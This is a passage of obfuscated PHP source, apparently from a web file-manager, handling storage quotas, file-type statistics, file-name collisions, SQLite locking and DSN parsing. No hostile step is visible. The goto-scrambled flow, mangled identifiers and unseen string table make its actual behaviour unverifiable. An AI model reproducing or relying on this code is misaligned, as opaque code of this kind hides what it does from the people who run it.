$CÏ¶À´ßô[33]; if (!isset($a©ôÀ£ÕÓ³[$E”²ŠŞ·Î])) { continue; } if ($aÊ³äâìÔ³[$CÏ¶À´ßô[417]] == $a©ôÀ£ÕÓ³[$E”²ŠŞ·Î][$CÏ¶À´ßô[417]]) { $a©ôÀ£ÕÓ³[$E”²ŠŞ·Î][$CÏ¶À´ßô[77]] += $aÊ³äâìÔ³[$CÏ¶À´ßô[77]]; } } } $CƒÃ ŒêõÌ = array(); goto f÷ùÎéäªï; E‚³äÙéÀ½: $a©ôÀ£ÕÓ³[] = $dÏé˜Óºˆô; $a©ôÀ£ÕÓ³ = array_to_keyvalue($a©ôÀ£ÕÓ³, $CÏ¶À´ßô[390]); foreach ($a©ôÀ£ÕÓ³ as $B·§ÄØÜè => $aÊ³äâìÔ³) { $a©ôÀ£ÕÓ³[$B·§ÄØÜè][$CÏ¶À´ßô[1960]] = $a©ôÀ£ÕÓ³[$B·§ÄØÜè][$CÏ¶À´ßô[77]]; $a©ôÀ£ÕÓ³[$B·§ÄØÜè][$CÏ¶À´ßô[77]] = 0; } goto d™éÅ†ê; f÷ùÎéäªï: foreach ($a©ôÀ£ÕÓ³ as $aÊ³äâìÔ³) { if ($aÊ³äâìÔ³[$CÏ¶À´ßô[77]] == $aÊ³äâìÔ³[$CÏ¶À´ßô[1960]]) { continue; } $CƒÃ ŒêõÌ[] = array($CÏ¶À´ßô[390], $aÊ³äâìÔ³[$CÏ¶À´ßô[390]], $CÏ¶À´ßô[77], $aÊ³äâìÔ³[$CÏ¶À´ßô[77]]); } $this->saveAll($CƒÃ ŒêõÌ); goto d¦‹‰ÎĞœÖ; fŠ‰â¿Š¨ò: $CÏ¶À´ßô =& $_SERVER[µ…]; $this->sourceCacheClear($eé¿òËæÈ); $dÏé˜Óºˆô = $this->sourceInfo($eé¿òËæÈ); goto e†¹£¢À; Fìï³ÅêÅ¥: $CÅ‰‚ŞÃíÊ[$CÏ¶À´ßô[397]] = 0; $D¼°šÕ¦¾… = $this->field($F¥©Û†²ªà)->where($CÅ‰‚ŞÃíÊ)->select(); if (!$D¼°šÕ¦¾…) { return; } goto E‚³äÙéÀ½; e†¹£¢À: $CÅ‰‚ŞÃíÊ = array($CÏ¶À´ßô[541] => 1, $CÏ¶À´ßô[548] => array($CÏ¶À´ßô[507], $dÏé˜Óºˆô[$CÏ¶À´ßô[481]] . $eé¿òËæÈ . $CÏ¶À´ßô[508])); $F¥©Û†²ªà = $CÏ¶À´ßô[1959]; $a©ôÀ£ÕÓ³ = $this->field($F¥©Û†²ªà)->where($CÅ‰‚ŞÃíÊ)->select(); goto Fìï³ÅêÅ¥; d¦‹‰ÎĞœÖ: } public function userSpaceReset($eº¯œ­¹ã = false) { $cÄ²÷×Çˆ =& $_SERVER[µ…]; $CÃ±“´¨®„ = $this->where(array($cÄ²÷×Çˆ[398] => self::TYPE_USER, $cÄ²÷×Çˆ[478] => $eº¯œ­¹ã, $cÄ²÷×Çˆ[397] => 0))->sum($cÄ²÷×Çˆ[77]); $CÃ±“´¨®„ = !$CÃ±“´¨®„ || $CÃ±“´¨®„ <= 0 ? 0 : $CÃ±“´¨®„; Model($cÄ²÷×Çˆ[497])->userEdit($eº¯œ­¹ã, array($cÄ²÷×Çˆ[1655] => $CÃ±“´¨®„)); } public function targetSpaceUpdate($C–ñÈ¯ã×á, $a’—ÒŸ©‘¥) { $dÏƒÊ…¤íî =& $_SERVER[µ…]; if (!$a’—ÒŸ©‘¥) { return; } if (!in_array($C–ñÈ¯ã×á, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $fÂŒÓ“ƒ¶‡ = $this->targetSpaceSize($C–ñÈ¯ã×á, $a’—ÒŸ©‘¥); if ($C–ñÈ¯ã×á == self::TYPE_USER) { Model($dÏƒÊ…¤íî[497])->userEdit($a’—ÒŸ©‘¥, array($dÏƒÊ…¤íî[1655] => $fÂŒÓ“ƒ¶‡)); } else { if ($C–ñÈ¯ã×á == self::TYPE_GROUP) { Model($dÏƒÊ…¤íî[480])->groupEdit($a’—ÒŸ©‘¥, array($dÏƒÊ…¤íî[1655] => $fÂŒÓ“ƒ¶‡)); } } } public function targetSpaceSize($F­íĞ¤„ê‰, $bĞÉµØù¾…) { goto AßÃ÷Ë“Ì; F¦Ì®¦í‰ê: $CÖ™¬ÒØÓœ = floatval($eƒ– áÚ÷[$bÓÊÎÙ¤ğ[77]]); $Aºò‹µí÷ = array($bÓÊÎÙ¤ğ[548] => array($bÓÊÎÙ¤ğ[507], $bÓÊÎÙ¤ğ[493] . $eƒ– áÚ÷[$bÓÊÎÙ¤ğ[390]] . $bÓÊÎÙ¤ğ[508])); $bÇ’ˆ‚÷Î = Model($bÓÊÎÙ¤ğ[415])->field($bÓÊÎÙ¤ğ[404])->where($Aºò‹µí÷)->select(); goto F£‰œ¼î¤; F£‰œ¼î¤: $bÇ’ˆ‚÷Î = array_to_keyvalue($bÇ’ˆ‚÷Î, $bÓÊÎÙ¤ğ[33], $bÓÊÎÙ¤ğ[390]); $bÇ’ˆ‚÷Î = array_unique(array_filter($bÇ’ˆ‚÷Î)); if ($bÇ’ˆ‚÷Î) { $Aºò‹µí÷ = array($bÓÊÎÙ¤ğ[404] => array($bÓÊÎÙ¤ğ[405], $bÇ’ˆ‚÷Î)); $CÖ™¬ÒØÓœ += floatval($this->where($Aºò‹µí÷)->sum($bÓÊÎÙ¤ğ[77])); } goto dŠ©¤¯ÃİÙ; AßÃ÷Ë“Ì: $bÓÊÎÙ¤ğ =& $_SERVER[µ…]; $eƒ– áÚ÷ = $this->sourceRoot($F­íĞ¤„ê‰, $bĞÉµØù¾…, !0); if (!$eƒ– áÚ÷) { return 0; } goto F¦Ì®¦í‰ê; dŠ©¤¯ÃİÙ: $CÖ™¬ÒØÓœ = !$CÖ™¬ÒØÓœ || $CÖ™¬ÒØÓœ <= 0 ? 0 : $CÖ™¬ÒØÓœ; return $CÖ™¬ÒØÓœ; goto DãŞä¨Üë‰; DãŞä¨Üë‰: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($A§”¤—®İ) { return $this->fileTypeProfile($A§”¤—®İ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($FãÌÈ„í) { return $this->fileTypeProfile($FãÌÈ„í, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Bî®´ôë, $E¨²ÑªïÓË) { goto Fí•ÍŸØÕ¸; dÄ·‘’ŸÕÒ: if ($bÉ£Ğ‰«á¹) { return $bÉ£Ğ‰«á¹; } $bÃÙ“ÔÉŠñ = array($b¡¹Ïë´ÕÜ[541] => 0); if ($Bî®´ôë != !1) { $bÃÙ“ÔÉŠñ[$b¡¹Ïë´ÕÜ[478]] = $Bî®´ôë; $bÃÙ“ÔÉŠñ[$b¡¹Ïë´ÕÜ[398]] = $E¨²ÑªïÓË; } goto aº¿Şöì«Ü; Fí•ÍŸØÕ¸: $b¡¹Ïë´ÕÜ =& $_SERVER[µ…]; $dš÷Ş²ß¤‡ = $b¡¹Ïë´ÕÜ[1961] . $Bî®´ôë . $b¡¹Ïë´ÕÜ[70] . $E¨²ÑªïÓË; $bÉ£Ğ‰«á¹ = Cache::get($dš÷Ş²ß¤‡); goto dÄ·‘’ŸÕÒ; aº¿Şöì«Ü: $AçÍí© ¯Œ = array(); $AçÍí© ¯Œ[$b¡¹Ïë´ÕÜ[1962]] = array($b¡¹Ïë´ÕÜ[1963] => LNG($b¡¹Ïë´ÕÜ[1962]), $b¡¹Ïë´ÕÜ[1964] => $this->where($bÃÙ“ÔÉŠñ)->count(), $b¡¹Ïë´ÕÜ[543] => $this->where($bÃÙ“ÔÉŠñ)->sum($b¡¹Ïë´ÕÜ[77])); $AÌ¡âóñİ = KodIO::fileTypeList(); goto E«ÊùâÑ; E«ÊùâÑ: foreach ($AÌ¡âóñİ as $F‹İÈÜÅÊ¾ => $f§óˆñ‡Ã) { $bÃÙ“ÔÉŠñ[$b¡¹Ïë´ÕÜ[399]] = $this->fileTypeWhere($F‹İÈÜÅÊ¾); $AçÍí© ¯Œ[$F‹İÈÜÅÊ¾] = array($b¡¹Ïë´ÕÜ[1963] => $f§óˆñ‡Ã[$b¡¹Ïë´ÕÜ[28]], $b¡¹Ïë´ÕÜ[1964] => $this->where($bÃÙ“ÔÉŠñ)->count(), $b¡¹Ïë´ÕÜ[543] => $this->where($bÃÙ“ÔÉŠñ)->sum($b¡¹Ïë´ÕÜ[77])); } Cache::set($dš÷Ş²ß¤‡, $AçÍí© ¯Œ, 1200); return $AçÍí© ¯Œ; goto D‘Ê„à†Ó; D‘Ê„à†Ó: } public function fileNameExist($D‰ºåùŒéÕ, $bÄ²¨ŞÀ•“) { $eùõƒ™¡£Ó =& $_SERVER[µ…]; $bò‚©ğÌ©Ë = $this->childList($D‰ºåùŒéÕ); foreach ($bò‚©ğÌ©Ë as $fÅ·„Äˆ—) { if ($fÅ·„Äˆ—[$eùõƒ™¡£Ó[28]] == $bÄ²¨ŞÀ•“) { return $fÅ·„Äˆ—[$eùõƒ™¡£Ó[390]]; } if (strtolower($fÅ·„Äˆ—[$eùõƒ™¡£Ó[28]]) == strtolower($bÄ²¨ŞÀ•“)) { return $fÅ·„Äˆ—[$eùõƒ™¡£Ó[390]]; } } return !1; } public function childList($cÍ˜ÎÙÌŠì) { goto DØ«Ñ¢©â; EÖÌ–¡ƒÜí: self::$cacheChildList[$f‚¥”î®®] = $d„¼²í—²; foreach ($d„¼²í—² as $e•óìàµ®) { $f‚¥”î®® = $FË«ÛÛÎ¦[432] . $e•óìàµ®[$FË«ÛÛÎ¦[390]]; self::$cacheSourceInfo[$f‚¥”î®®] = $e•óìàµ®; } return $d„¼²í—²; goto dØÊ‰«‘º‡; DØ«Ñ¢©â: $FË«ÛÛÎ¦ =& $_SERVER[µ…]; $f‚¥”î®® = $FË«ÛÛÎ¦[1939] . $cÍ˜ÎÙÌŠì; if (isset(self::$cacheChildList[$f‚¥”î®®])) { return self::$cacheChildList[$f‚¥”î®®]; } goto dÒ¤‹îœÔ; dÒ¤‹îœÔ: $bäŞ­¦·‡ñ = array($FË«ÛÛÎ¦[472] => intval($cÍ˜ÎÙÌŠì), $FË«ÛÛÎ¦[417] => 0); $d„¼²í—² = $this->where($bäŞ­¦·‡ñ)->select(); $d„¼²í—² = $d„¼²í—² ? $d„¼²í—² : array(); goto EÖÌ–¡ƒÜí; dØÊ‰«‘º‡: } public function fileNameAuto($A”á‰Ä™, $Cñ¤÷Í¨±ê, $EáÃòŠ÷¶ä = REPEAT_RENAME, $EßÍá¦Á… = false) { $Cà‘…ğœ× =& $_SERVER[µ…]; $dï‹İ·Œ·‘ = $this->childList($A”á‰Ä™); $b¤ƒÉ„µî¿ = array_to_keyvalue($dï‹İ·Œ·‘, $Cà‘…ğœ×[33], $Cà‘…ğœ×[28]); return $this->fileNameAutoGet($b¤ƒÉ„µî¿, $Cñ¤÷Í¨±ê, $EáÃòŠ÷¶ä, $EßÍá¦Á…); } public function fileNameAutoGet($aˆŒ´™È, $eÉµ±Ç±‘, $FÃÆ‚•¤Ú, $b¶„ñ»¼‰‘) { $d³œéâÜš» =& $_SERVER[µ…]; if ($FÃÆ‚•¤Ú == REPEAT_REPLACE || !$aˆŒ´™È || !in_array_not_case($eÉµ±Ç±‘, $aˆŒ´™È) || $b¶„ñ»¼‰‘ && $FÃÆ‚•¤Ú != REPEAT_RENAME_FOLDER) { return $eÉµ±Ç±‘; } if ($FÃÆ‚•¤Ú == REPEAT_SKIP) { return !1; } $B»ëÎŒœÍ” = $d³œéâÜš»[94] . get_path_ext($eÉµ±Ç±‘); $B»ëÎŒœÍ” = $B»ëÎŒœÍ” == $d³œéâÜš»[94] || $b¶„ñ»¼‰‘ ? $d³œéâÜš»[33] : $B»ëÎŒœÍ”; for ($CÅ‰ŒÉÆ½‚ = 1; $CÅ‰ŒÉÆ½‚ <= count($aˆŒ´™È) + 1; $CÅ‰ŒÉÆ½‚++) { $eÕ†Îíª¸– = substr($eÉµ±Ç±‘, 0, strlen($eÉµ±Ç±‘) - strlen($B»ëÎŒœÍ”)); $F”çƒˆÛ½ = $eÕ†Îíª¸– . "\x28{$CÅ‰ŒÉÆ½‚}\x29{$B»ëÎŒœÍ”}"; if (!in_array_not_case($F”çƒˆÛ½, $aˆŒ´™È)) { return $F”çƒˆÛ½; } } } } goto bŞ†•; b¿²ÀÃª: class DbSqlite extends DbSqliteBase { public function query($c‹‹¸ƒãœˆ) { $d¤âŞÑ­‘‰ =& $_SERVER[µ…]; if (!CacheLock::fileLock($d¤âŞÑ­‘‰[9])) { return !1; } $aˆÀ£Æ±Šç = parent::query($c‹‹¸ƒãœˆ); CacheLock::fileUnLock($d¤âŞÑ­‘‰[9]); return $aˆÀ£Æ±Šç; } public function execute($bÒÚª¬«Ú‡) { $Få’–¤ŒÄŒ =& $_SERVER[µ…]; if (!CacheLock::fileLock($Få’–¤ŒÄŒ[9])) { return !1; } $dˆàªÑŠí¬ = parent::execute($bÒÚª¬«Ú‡); CacheLock::fileUnLock($Få’–¤ŒÄŒ[9]); return $dˆàªÑŠí¬; } } class DbSqlite3 extends DbSqlite3Base { public function query($A¶Ì£˜á) { $BÚŞ˜Öº³« =& $_SERVER[µ…]; if (!CacheLock::fileLock($BÚŞ˜Öº³«[9])) { return !1; } $AİØº¨ÍğÇ = parent::query($A¶Ì£˜á); CacheLock::fileUnLock($BÚŞ˜Öº³«[9]); return $AİØº¨ÍğÇ; } public function execute($A Ãê„Ó‚Ñ) { $CÔ„¹Áºƒ =& $_SERVER[µ…]; if (!CacheLock::fileLock($CÔ„¹Áºƒ[9])) { return !1; } $DŸ·Í­ºŸ = parent::execute($A Ãê„Ó‚Ñ); CacheLock::fileUnLock($CÔ„¹Áºƒ[9]); return $DŸ·Í­ºŸ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\145\x71" => "\x3c\x3e", "\147\164" => "\76", "\145\147\x74" => "\x3e\75", "\154\164" => "\74", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\157\x74\x6c\151\x6b\145" => "\116\117\124\40\x4c\x49\x4b\105", "\x6c\x69\x6b\145" => "\x4c\x49\113\105", "\x69\x6e" => "\x49\116", "\156\x6f\164\x69\x6e" => "\x4e\x4f\124\x20\x49\116", "\156\x6f\164\x20\x69\x6e" => "\116\x4f\x54\x20\x49\116", "\142\145\164\x77\145\145\x6e" => "\x42\x45\x54\x57\x45\x45\116", "\x6e\x6f\164\x62\x65\x74\x77\x65\145\156" => "\116\117\124\x20\102\105\x54\x57\x45\105\116", "\156\157\164\40\x62\x65\164\167\145\x65\x6e" => "\116\117\x54\40\x42\105\124\127\x45\105\116"); protected $selectSql = "\x53\105\114\105\103\124\x25\104\x49\123\x54\x49\x4e\x43\124\x25\x20\45\106\111\x45\114\x44\x25\40\x46\122\117\115\x20\x25\124\101\x42\x4c\x45\45\x25\x4a\117\x49\116\45\45\127\x48\x45\x52\105\45\45\x47\x52\x4f\125\120\x25\45\110\101\126\x49\x4e\x47\x25\x25\117\x52\x44\105\122\45\45\114\x49\x4d\x49\x54\45\x20\x25\125\116\111\x4f\x4e\45\x25\x43\x4f\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $Eà¯¹×ƒ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[µ…][897], $Eà¯¹×ƒ); } public function factory($DãîéÎŠ¬‘ = '') { goto bœğ¼¸Ÿõ; aİğˆñº‡‚: $this->dbType = ucwords(strtolower($DãîéÎŠ¬‘[$Fä’¼¶ØË…[898]])); $cİƒùõŠ‰æ = $Fä’¼¶ØË…[900] . $this->dbType; if (class_exists($cİƒùõŠ‰æ)) { $eç–›‰ãà¯ = new $cİƒùõŠ‰æ($DãîéÎŠ¬‘); if ($Fä’¼¶ØË…[740] != strtolower($DãîéÎŠ¬‘[$Fä’¼¶ØË…[898]])) { $eç–›‰ãà¯->dbType = strtoupper($this->dbType); } else { $eç–›‰ãà¯->dbType = $this->_getDsnType($DãîéÎŠ¬‘[$Fä’¼¶ØË…[853]]); } } else { think_exception(think_lang($Fä’¼¶ØË…[901]) . $Fä’¼¶ØË…[902] . $cİƒùõŠ‰æ); } goto C·ˆÙ¹åí„; C·ˆÙ¹åí„: return $eç–›‰ãà¯; goto Cç‚¸à¢À; bœğ¼¸Ÿõ: $Fä’¼¶ØË… =& $_SERVER[µ…]; $DãîéÎŠ¬‘ = $this->parseConfig($DãîéÎŠ¬‘); if (empty($DãîéÎŠ¬‘[$Fä’¼¶ØË…[898]])) { think_exception(think_lang($Fä’¼¶ØË…[899])); } goto aİğˆñº‡‚; Cç‚¸à¢À: } public function __call($Få‰ÆÚƒŒ, $B‘õå‰øõÕ) { if (method_exists($this, $Få‰ÆÚƒŒ)) { return call_user_func_array(array($this, $Få‰ÆÚƒŒ), $B‘õå‰øõÕ); } } protected function _getDsnType($F«™¸Úéé) { $c¶ÚÜõ‰ğ‹ = explode($_SERVER[µ…][4], $F«™¸Úéé); $D­Ğ™‰äÙ = strtoupper(trim($c¶ÚÜõ‰ğ‹[0])); return $D­Ğ™‰äÙ; } private function parseConfig($Aİ¾”ÚĞ±« = '') { $b¸˜ÒÁöÅ¯ =& $_SERVER[µ…]; if (!empty($Aİ¾”ÚĞ±«) && is_string($Aİ¾”ÚĞ±«)) { $Aİ¾”ÚĞ±« = $this->parseDSN($Aİ¾”ÚĞ±«); } elseif (is_array($Aİ¾”ÚĞ±«)) { $Aİ¾”ÚĞ±« = array_change_key_case($Aİ¾”ÚĞ±«); $Aİ¾”ÚĞ±« = array($b¸˜ÒÁöÅ¯[898] => $Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[739]], $b¸˜ÒÁöÅ¯[826] => $Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[903]], $b¸˜ÒÁöÅ¯[827] => $Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[904]], $b¸˜ÒÁöÅ¯[824] => $Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[905]], $b¸˜ÒÁöÅ¯[825] => $Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[906]], $b¸˜ÒÁöÅ¯[17] => $Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[907]], $b¸˜ÒÁöÅ¯[853] => $Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[741]], $b¸˜ÒÁöÅ¯[13] => isset($Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[908]]) ? $Aİ¾”ÚĞ±«[$b¸˜ÒÁöÅ¯[908]] : array()); } elseif (empty($Aİ¾”ÚĞ±«)) { if (think_config($b¸˜ÒÁöÅ¯[909]) && $b¸˜ÒÁöÅ¯[740] != strtolower(think_config($b¸˜ÒÁöÅ¯[910]))) { $Aİ¾”ÚĞ±« = $this->parseDSN(think_config($b¸˜ÒÁöÅ¯[909])); } else { $Aİ¾”ÚĞ±« = array($b¸˜ÒÁöÅ¯[898] => think_config($b¸˜ÒÁöÅ¯[910]), $b¸˜ÒÁöÅ¯[826] => think_config($b¸˜ÒÁöÅ¯[911]), $b¸˜ÒÁöÅ¯[827] => think_config($b¸˜ÒÁöÅ¯[912]), $b¸˜ÒÁöÅ¯[824] => think_config($b¸˜ÒÁöÅ¯[913]), $b¸˜ÒÁöÅ¯[825] => think_config($b¸˜ÒÁöÅ¯[914]), $b¸˜ÒÁöÅ¯[17] => think_config($b¸˜ÒÁöÅ¯[242]), $b¸˜ÒÁöÅ¯[853] => think_config($b¸˜ÒÁöÅ¯[909]), $b¸˜ÒÁöÅ¯[13] => think_config($b¸˜ÒÁöÅ¯[915])); } } return $Aİ¾”ÚĞ±«; } protected function initConnect($a£öÆ»±Øà = true) { if (1 == think_config($_SERVER[µ…][18])) { $this->_linkID = $this->multiConnect($a£öÆ»±Øà); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $E°İÖåë—± => $d°˜¡„…) { $this->_linkID = $d°˜¡„…; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($e«éÏÍĞª‰ = false) { $E›ëŸ›Éù¢ =& $_SERVER[µ…]; static $cò­ˆšãÆ = array(); if (empty($cò­ˆšãÆ)) { foreach ($this->config as $EğŞƒ˜ĞÒë => $aë„–ÈÀ¿) { $cò­ˆšãÆ[$EğŞƒ˜ĞÒë] = explode($E›ëŸ›Éù¢[47], $aë„–ÈÀ¿); } } if (think_config($E›ëŸ›Éù¢[916])) { if ($e«éÏÍĞª‰) { $CÀ…ÃŒ›’ = floor(mt_rand(0, think_config($E›ëŸ›Éù¢[917]) - 1)); } else { if (is_numeric(think_config($E›ëŸ›Éù¢[918]))) { $CÀ…ÃŒ›’ = think_config($E›ëŸ›Éù¢[918]); } else { $CÀ…ÃŒ›’ = floor(mt_rand(think_config($E›ëŸ›Éù¢[917]), count($cò­ˆšãÆ[$E›ëŸ›Éù¢[824]]) - 1)); } } } else { $CÀ…ÃŒ›’ = floor(mt_rand(0, count($cò­ˆšãÆ[$E›ëŸ›Éù¢[824]]) - 1)); } $d–éˆ©Ğ‡¢ = array($E›ëŸ›Éù¢[826] => isset($cò­ˆšãÆ[$E›ëŸ›Éù¢[826]][$CÀ…ÃŒ›’]) ? $cò­ˆšãÆ[$E›ëŸ›Éù¢[826]][$CÀ…ÃŒ›’] : $cò­ˆšãÆ[$E›ëŸ›Éù¢[826]][0], $E›ëŸ›Éù¢[827] => isset($cò­ˆšãÆ[$E›ëŸ›Éù¢[827]][$CÀ…ÃŒ›’]) ? $cò­ˆšãÆ[$E›ëŸ›Éù¢[827]][$CÀ…ÃŒ›’] : $cò­ˆšãÆ[$E›ëŸ›Éù¢[827]][0], $E›ëŸ›Éù¢[824] => isset($cò­ˆšãÆ[$E›ëŸ›Éù¢[824]][$CÀ…ÃŒ›’]) ? $cò­ˆšãÆ[$E›ëŸ›Éù¢[824]][$CÀ…ÃŒ›’] : $cò­ˆšãÆ[$E›ëŸ›Éù¢[824]][0], $E›ëŸ›Éù¢[825] => isset($cò­ˆšãÆ[$E›ëŸ›Éù¢[825]][$CÀ…ÃŒ›’]) ? $cò­ˆšãÆ[$E›ëŸ›Éù¢[825]][$CÀ…ÃŒ›’] : $cò­ˆšãÆ[$E›ëŸ›Éù¢[825]][0], $E›ëŸ›Éù¢[17] => isset($cò­ˆšãÆ[$E›ëŸ›Éù¢[17]][$CÀ…ÃŒ›’]) ? $cò­ˆšãÆ[$E›ëŸ›Éù¢[17]][$CÀ…ÃŒ›’] : $cò­ˆšãÆ[$E›ëŸ›Éù¢[17]][0], $E›ëŸ›Éù¢[853] => isset($cò­ˆšãÆ[$E›ëŸ›Éù¢[853]][$CÀ…ÃŒ›’]) ? $cò­ˆšãÆ[$E›ëŸ›Éù¢[853]][$CÀ…ÃŒ›’] : $cò­ˆšãÆ[$E›ëŸ›Éù¢[853]][0], $E›ëŸ›Éù¢[13] => isset($cò­ˆšãÆ[$E›ëŸ›Éù¢[13]][$CÀ…ÃŒ›’]) ? $cò­ˆšãÆ[$E›ëŸ›Éù¢[13]][$CÀ…ÃŒ›’] : $cò­ˆšãÆ[$E›ëŸ›Éù¢[13]][0]); return $this->connect($d–éˆ©Ğ‡¢, $CÀ…ÃŒ›’); } public function parseDSN($eõÄ¶ÌÊâ¾) { $aÃ«äõ ø“ =& $_SERVER[µ…]; if (empty($eõÄ¶ÌÊâ¾)) { return !1; } $EŸ•äî·Ê¦ = parse_url($eõÄ¶ÌÊâ¾); if ($EŸ•äî·Ê¦[$aÃ«äõ ø“[173]]) { $Aº³‰œ = array($aÃ«äõ ø“[898] => $EŸ•äî·Ê¦[$aÃ«äõ ø“[173]], $aÃ«äõ ø“[826] => isset($EŸ•äî·Ê¦[$aÃ«äõ ø“[557]]) ? $EŸ•äî·Ê¦[$aÃ«äõ ø“[557]] : $aÃ«äõ ø“[33], $aÃ«äõ ø“[827] => isset($EŸ•äî·Ê¦[$aÃ«äõ ø“[919]]) ? $EŸ•äî·Ê¦[$aÃ«äõ ø“[919]] : $aÃ«äõ ø“[33], $aÃ«äõ ø“[824] => isset($EŸ•äî·Ê¦[$aÃ«äõ ø“[174]]) ? $EŸ•äî·Ê¦[$aÃ«äõ ø“[174]] : $aÃ«äõ ø“[33], $aÃ«äõ ø“[825] => isset($EŸ•äî·Ê¦[$aÃ«äõ ø“[175]]) ? $EŸ•äî·Ê¦[$aÃ«äõ ø“[175]] : $aÃ«äõ ø“[33], $aÃ«äõ ø“[17] => isset($EŸ•äî·Ê¦[$aÃ«äõ ø“[75]]) ? substr($EŸ•äî·Ê¦[$aÃ«äõ ø“[75]], 1) : $aÃ«äõ ø“[33]); } else { preg_match($aÃ«äõ ø“[920], trim($eõÄ¶ÌÊâ¾), $bÑ‘Óİ±—æ); $Aº³‰œ = array($aÃ«äõ ø“[898] => $bÑ‘Óİ±—æ[1], $aÃ«äõ ø“[826] => $bÑ‘Óİ±—æ[2], $aÃ«äõ ø“[827] => $bÑ‘Óİ±—æ[3], $aÃ«äõ ø“[824] => $bÑ‘Óİ±—æ[4], $aÃ«äõ ø“[825] => $bÑ‘Óİ±—æ[5], $aÃ«äõ ø“[17] => $bÑ‘Óİ±—æ[6]); } $Aº³‰œ[$aÃ«äõ ø“[853]] = $aÃ«äõ ø“[33]; return $Aº³‰œ; } protected function debug() { $dˆŒá˜Šõ =& $_SERVER[µ…]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $dˆŒá˜Šõ[921]; if (think_config($dˆŒá˜Šõ[922])) { think_status($dˆŒá˜Šõ[923]); think_trace($this->queryStr . $dˆŒá˜Šõ[924] . think_status($dˆŒá˜Šõ[20], $dˆŒá˜Šõ[923], 6) . $dˆŒá˜Šõ[925], $dˆŒá˜Šõ[33], $dˆŒá˜Šõ[926]); } } protected function parseLock($aç†š¸±÷„ = false) { $bª£Îçö¦¡ =& $_SERVER[µ…]; if (!$aç†š¸±÷„) { return $bª£Îçö¦¡[33]; } if ($bª£Îçö¦¡[855] == $this->dbType) { return $bª£Îçö¦¡[927]; } return $bª£Îçö¦¡[928]; } protected function parseSet($F÷ë—Æ¶ŒŠ) { $cÚ½­É‚½ =& $_SERVER[µ…]; foreach ($F÷ë—Æ¶ŒŠ as $dÔ™÷ùŒ… => $eî™½ºŒÀó) { if (is_array($eî™½ºŒÀó) && $cÚ½­É‚½[293] == $eî™½ºŒÀó[0]) { $f§„˜òÁô[] = $this->parseKey($dÔ™÷ùŒ…) . $cÚ½­É‚½[929] . $eî™½ºŒÀó[1]; } elseif (is_scalar($eî™½ºŒÀó) || is_null($eî™½ºŒÀó)) { $f§„˜òÁô[] = $this->parseKey($dÔ™÷ùŒ…) . $cÚ½­É‚½[929] . $this->parseValue($eî™½ºŒÀó); } } return $cÚ½­É‚½[930] . implode($cÚ½­É‚½[47], $f§„˜òÁô); } protected function bindParam($CÆâß™¦êò, $aå¤§ë×) { $this->bind[$_SERVER[µ…][4] . $CÆâß™¦êò] = $aå¤§ë×; } protected function parseBind($Döå…ªÍ‹‚) { $Döå…ªÍ‹‚ = array_merge($this->bind, $Döå…ªÍ‹‚); $this->bind = array(); return $Döå…ªÍ‹‚; } function parseKey(&$bÎ¾å”°Àñ, $còâè»ß´ = true) { if ($còâè»ß´) { $bÎ¾å”°Àñ = $this->parseKeyCheck($bÎ¾å”°Àñ); } return $bÎ¾å”°Àñ; } function parseKeyCheck($d¶Ø“˜æÙ«) { $e„¤¯îì¶ =& $_SERVER[µ…]; $d¶Ø“˜æÙ« = trim($d¶Ø“˜æÙ«); if (!preg_match($e„¤¯îì¶[931], $d¶Ø“˜æÙ«)) { think_exception($e„¤¯îì¶[932] . $d¶Ø“˜æÙ«); } return $d¶Ø“˜æÙ«; } protected function parseValue($FêˆÏİ‘Ü) { $B˜“°öÆšğ =& $_SERVER[µ…]; if (is_string($FêˆÏİ‘Ü)) { $FêˆÏİ‘Ü = $B˜“°öÆšğ[894] . $this->escapeString($FêˆÏİ‘Ü) . $B˜“°öÆšğ[894]; } elseif (isset($FêˆÏİ‘Ü[0]) && is_string($FêˆÏİ‘Ü[0]) && strtolower($FêˆÏİ‘Ü[0]) == $B˜“°öÆšğ[293]) { $FêˆÏİ‘Ü = $this->escapeString($FêˆÏİ‘Ü[1]); } elseif (is_array($FêˆÏİ‘Ü)) { $FêˆÏİ‘Ü = array_map(array($this, $B˜“°öÆšğ[895]), $FêˆÏİ‘Ü); } elseif (is_bool($FêˆÏİ‘Ü)) { $FêˆÏİ‘Ü = $FêˆÏİ‘Ü ? $B˜“°öÆšğ[86] : $B˜“°öÆšğ[491]; } elseif (is_null($FêˆÏİ‘Ü)) { $FêˆÏİ‘Ü = $B˜“°öÆšğ[102]; } return $FêˆÏİ‘Ü; } protected function parseField($D œÄÛÚ§) { $cŒÖ°¡™„Ä =& $_SERVER[µ…]; if (is_string($D œÄÛÚ§) && strpos($D œÄÛÚ§, $cŒÖ°¡™„Ä[47])) { $D œÄÛÚ§ = explode($cŒÖ°¡™„Ä[47], $D œÄÛÚ§); } if (is_array($D œÄÛÚ§)) { $F«–ğ¼÷æ = array(); foreach 